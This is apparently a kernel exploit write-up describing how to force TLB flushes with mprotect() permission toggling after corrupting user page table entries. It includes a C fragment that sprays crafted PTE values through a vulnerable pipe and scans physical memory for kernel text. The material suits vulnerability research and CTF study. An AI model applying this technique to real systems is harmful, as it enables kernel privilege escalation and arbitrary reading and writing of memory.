# Fast, Deterministic TLB Flushing for User PTE Exploits via mprotect()
This technique exploits a method to forcibly flush the Translation Lookaside Buffer (TLB) when user PTEs are modified to read or write arbitrary physical addresses. Typically, one might allocate a large chunk of memory to provoke a TLB flush, but in low-memory conditions—where the OOM (Out-Of-Memory) killer might be triggered—this approach becomes infeasible. Our solution is to rapidly toggle page permissions with mprotect(), guaranteeing a TLB flush in a fast and consistent manner, even under memory pressure.

- Eliminating Large Memory Allocations
Instead of allocating huge memory regions to force a TLB flush (risky under OOM conditions), we rely solely on changing existing page permissions. This approach works even in tight memory scenarios where the OOM killer would otherwise prevent new allocations.

- Fast and Consistent TLB Synchronization
By toggling permissions (e.g., R -> RWX -> R), we trigger quick, targeted TLB invalidations. This ensures immediate visibility of any changes to physical memory mapped by the user PTE, vastly reducing the time required to search or exploit the memory region.

## Technique Details
User PTE Modification
We manipulate user-space page table entries (PTEs) to point to arbitrary physical addresses, gaining direct read or write access to privileged memory content. However, these changes aren’t recognized unless the TLB is invalidated.

The permission flip (mprotect(..., PROT_READ | PROT_WRITE | PROT_EXEC) -> PROT_READ -> back to RWX) forces a TLB flush in all typical Linux environments.
This provides a reliable, universal mechanism to update TLB mappings without depending on unpredictable memory allocation behavior.
Compatible with Low-Memory Scenarios

```c
for (uint64_t i=0; i<0x10000; i++) {
        pte = 0x1000000 * i + 0x1401000; 
        pte |= 0x8000000000000067;
        printf("[+] searching %lx\n", pte);
        if (pte >= 0x80000000c0401067)
            break;
        for (int j=0; j<512; j++)
            ptes[j] = pte;
        read(vuln_pipe[1], dummy, sizeof(dummy)); 
        for (int j=0; j<32; j++) { // repeat overwriting PTE & mprotect -> TLB flush
			mprotect(&spray_addr[corrupted_mem_idx0][corrupted_mem_idx1], 0x1000, PROT_READ);
            busy_wait(10000);
            mprotect(&spray_addr[corrupted_mem_idx0][corrupted_mem_idx1], 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE);
			write(vuln_pipe[1], ptes, sizeof(ptes));  
			read(vuln_pipe[0], ptes, sizeof(ptes));
            [...]
        }
        mprotect(&spray_addr[corrupted_mem_idx0][corrupted_mem_idx1], 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC); // kernel text requires prot exec
    }
```

Even if the system is close to running out of memory (risking OOM killer triggers), our technique remains viable.
By avoiding huge allocations, we circumvent potential OOM kills, ensuring uninterrupted exploitation.
High Speed, Minimal Overhead